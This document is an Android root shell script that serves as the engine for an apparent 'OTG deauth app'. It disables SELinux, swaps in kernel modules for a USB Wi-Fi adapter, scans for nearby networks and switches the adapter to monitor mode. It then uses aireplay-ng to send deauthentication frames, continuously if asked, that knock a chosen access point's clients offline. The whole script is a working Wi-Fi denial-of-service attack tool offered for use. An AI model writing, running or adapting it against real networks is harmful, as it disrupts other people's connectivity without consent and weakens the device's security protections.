#!/system/bin/sh
# Root engine for OTG deauth app. Actions: setup detect scan monitor deauth restore
WIFI=/data/local/tmp/wifi
IW=$WIFI/iw
DEAUTH=$WIFI/deauth
AIREPLAY=$WIFI/aireplay-ng
export PATH=$WIFI:/system/bin:/system/xbin

mon_on() { # $1=iface $2=freq(optional)
  ip link set "$1" down 2>/dev/null
  "$IW" dev "$1" set type monitor 2>/dev/null
  ip link set "$1" up 2>/dev/null
  [ -n "$2" ] && "$IW" dev "$1" set freq "$2" 2>/dev/null
}

find_iface() {
  for d in /sys/class/net/wlan* /sys/class/net/wlx*; do
    [ -e "$d" ] || continue
    drv=$(readlink -f "$d/device/driver" 2>/dev/null)
    case "$drv" in *rtl8xxxu*) basename "$d"; return 0;; esac
  done
  return 1
}

case "$1" in
  setup)
    chmod 755 "$IW" "$DEAUTH" 2>/dev/null
    setenforce 0 2>/dev/null
    echo "$WIFI/fw" > /sys/module/firmware_class/parameters/path 2>/dev/null
    # idempotent: if our driver is already loaded, the swap is already done
    if lsmod | grep -q '^rtl8xxxu'; then echo "OK_already_swapped"; echo READY; exit 0; fi
    cmd -w wifi stop-softap 2>/dev/null
    svc wifi disable 2>/dev/null
    for i in wlan0 wlan1 p2p0 wifi-aware0; do ip link set "$i" down 2>/dev/null; done
    sleep 2
    rmmod wlan 2>/dev/null || rmmod qca_cld3_wlan 2>/dev/null
    sleep 1
    rmmod cfg80211 2>/dev/null
    # at this point rtl8xxxu is not loaded, so any remaining cfg80211 is the vendor one
    if lsmod | grep -q '^cfg80211'; then echo "ERR: vendor cfg80211 still loaded (wlan busy)"; exit 1; fi
    insmod "$WIFI/cfg80211.ko" 2>&1 && echo OK_cfg80211 || { echo "ERR insmod cfg80211"; exit 1; }
    insmod "$WIFI/mac80211.ko" 2>&1 && echo OK_mac80211 || { echo "ERR insmod mac80211"; exit 1; }
    insmod "$WIFI/rtl8xxxu.ko" 2>&1 && echo OK_rtl8xxxu || { echo "ERR insmod rtl8xxxu"; exit 1; }
    echo READY
    ;;
  detect)
    IF=$(find_iface) && echo "IFACE=$IF" || echo NOIFACE
    ;;
  scan)
    IF=$(find_iface) || { echo NOIFACE; exit 1; }
    ip link set "$IF" down 2>/dev/null
    "$IW" dev "$IF" set type managed 2>/dev/null
    ip link set "$IF" up 2>/dev/null
    sleep 1
    "$IW" dev "$IF" scan 2>/dev/null | awk '
      /^BSS / {gsub(/\(.*/,"",$2); bss=$2; ssid=""; freq=""; sig=""}
      /freq:/ {freq=$2}
      /signal:/ {sig=$2}
      /\tSSID: / {sub(/^\tSSID: /,""); ssid=$0}
      /primary channel:/ {ch=$NF; print bss"|"freq"|"ch"|"sig"|"ssid}
    '
    ;;
  monitor)
    IF=$(find_iface) || { echo NOIFACE; exit 1; }
    mon_on "$IF" "$2"
    echo "MON=$IF FREQ=$2"
    ;;
  test)
    # injection test: $2=freq(optional)
    IF=$(find_iface) || { echo NOIFACE; exit 1; }
    mon_on "$IF" "$2"
    "$AIREPLAY" -9 --ignore-negative-one "$IF" 2>&1
    ;;
  deauth)
    # args: $2=bssid $3=freq $4=count(0=continuous) $5=client(optional)
    IF=$(find_iface) || { echo NOIFACE; exit 1; }
    mon_on "$IF" "$3"
    if [ -n "$5" ]; then
      "$AIREPLAY" --deauth "$4" -a "$2" -c "$5" --ignore-negative-one "$IF" 2>&1
    else
      "$AIREPLAY" --deauth "$4" -a "$2" --ignore-negative-one "$IF" 2>&1
    fi
    ;;
  restore)
    rmmod rtl8xxxu 2>/dev/null; rmmod mac80211 2>/dev/null; rmmod cfg80211 2>/dev/null
    sync; svc power reboot 2>/dev/null || reboot
    ;;
  *) echo "unknown action: $1"; exit 2;;
esac
